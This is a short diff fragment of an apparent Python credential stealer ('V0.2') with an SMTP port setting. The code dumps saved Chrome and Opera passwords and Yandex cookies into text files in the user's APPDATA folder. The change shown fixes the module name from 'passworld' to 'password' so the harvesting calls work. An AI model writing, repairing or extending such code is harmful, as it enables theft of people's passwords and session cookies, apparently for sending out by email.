@@ -21,11 +21,11 @@ smtp_port = 587 # smtp port
 print("V0.2")
 
 file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
-file.write(passworld.chrome())
+file.write(password.chrome())
 file.close()
 
 file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")
-file.write(passworld.opera() + '\n')
+file.write(password.opera() + '\n')
 file.close()
 
 file = open(os.getenv("APPDATA") + '\\yandex_cookies.txt', "w+")
